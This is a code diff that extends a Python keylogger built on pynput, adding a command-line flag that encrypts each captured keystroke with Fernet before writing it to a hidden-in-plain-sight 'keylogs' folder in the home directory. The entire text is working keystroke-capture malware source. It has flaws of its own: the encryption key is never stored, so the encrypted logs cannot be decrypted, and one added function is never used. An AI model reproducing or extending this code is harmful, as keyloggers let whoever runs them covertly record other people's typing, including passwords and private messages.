@@ -1,6 +1,17 @@
 import os
 import time
+import argparse
+from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
+
+# Function to parse command-line arguments
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="Keylogger with log file encryption.")
+    parser.add_argument("--encrypt", action="store_true", help="Enable log file encryption.")
+    return parser.parse_args()
+
+# Parse command-line arguments
+args = parse_arguments()
 
 # Define the folder name and create it in the user's home directory
 log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
@@ -19,19 +30,45 @@ def create_new_log_file():
 # Define a function to write the key presses to a log file.
 def write_to_log(log_file, key):
     if hasattr(key, "name"):
-        log_file.write(f"[{key.name}]" + "\n")
+        key_str = f"[{key.name}]"
     else:
-        log_file.write(str(key) + "\n")
+        key_str = str(key)
+
+    # Encrypt the key_str if encryption is enabled
+    if cipher_suite:
+        encrypted_data = cipher_suite.encrypt(key_str.encode())
+        log_file.write(encrypted_data.decode() + "\n")
+    else:
+        log_file.write(key_str + "\n")
+
     log_file.flush()
-    
+
+current_log_file = open(create_new_log_file(), "a")
+
+# Generate an encryption key and initialize the Fernet cipher
+encryption_key = None
+cipher_suite = None
+
+if args.encrypt:
+    encryption_key = Fernet.generate_key()
+    cipher_suite = Fernet(encryption_key)
+
+# Create a function to encrypt and write data to the log file
+def encrypt_and_write(log_file, data):
+    if cipher_suite:
+        encrypted_data = cipher_suite.encrypt(data.encode())
+        log_file.write(encrypted_data.decode())
+    else:
+        write_to_log(log_file, data)
+    log_file.flush()
+
 # Define a function that listens for key presses and writes them to the log file.
 def on_key_press(key):
     if key == Key.esc:
         # Stop keylogger
         return False
-    write_to_log(current_log_file, key)
 
-current_log_file = open(create_new_log_file(), "a")    
+    write_to_log(current_log_file, key)
 
 # Set up the keylogger
 with Listener(on_press=on_key_press) as listener:
